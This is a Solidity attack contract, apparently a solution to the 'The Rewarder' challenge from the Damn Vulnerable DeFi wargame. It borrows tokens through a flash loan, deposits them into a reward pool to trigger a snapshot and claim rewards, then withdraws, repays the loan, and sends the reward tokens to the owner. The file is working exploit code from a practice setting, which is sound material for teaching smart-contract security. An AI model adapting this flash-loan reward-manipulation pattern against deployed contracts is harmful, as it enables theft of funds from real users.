// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface IDamnValuableToken {
    function transfer(address, uint256) external;

    function approve(address, uint256) external;
}

interface ITheRewarderPool {
    function deposit(uint256) external;

    function withdraw(uint256) external;
}

interface IRewardToken {
    function transfer(address, uint256) external;

    function balanceOf(address) external;
}

contract TheRewardAttacker {
    IFlashLoanerPool flashPool;
    IDamnValuableToken liquidityToken;
    ITheRewarderPool rewardPool;
    IRewardToken rewardToken;
    address owner;

    constructor(
        address _pool,
        address _liquidityToken,
        address _reward,
        address _rewardToken
    ) {
        flashPool = IFlashLoanerPool(_pool);
        liquidityToken = IDamnValuableToken(_liquidityToken);
        rewardPool = ITheRewarderPool(_reward);
        rewardToken = IRewardToken(_rewardToken);
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        flashPool.flashLoan(amount);
    }

    /* IFlashLoanerPool is expecting to call this function.
    // Before calling this function (attack function acctually)
    * ensure 5 days has passed in order to trigger new snapshot */
    function receiveFlashLoan(uint256 amount) public {
        //require(msg.sender == address(flashPool));

        //`approve` to allow token to be taken when we call `deposit`
        liquidityToken.approve(address(rewardPool), amount);

        //by depositing we mint an equivalent amount of AccToken, triger new snapshot and distributeRewards
        rewardPool.deposit(amount);

        //time to withdraw liquidity tokens
        rewardPool.withdraw(amount);

        //at the end of this fct, the loan must be repaid
        liquidityToken.transfer(msg.sender, amount);
    }

    // reward token is expecting to be in the attacker balance, not attacker smart contract.
    function withdrawRewardToken(address _address, uint256 amount) external {
        require(msg.sender == owner, "Not the owner");
        rewardToken.transfer(_address, amount);
    }
}
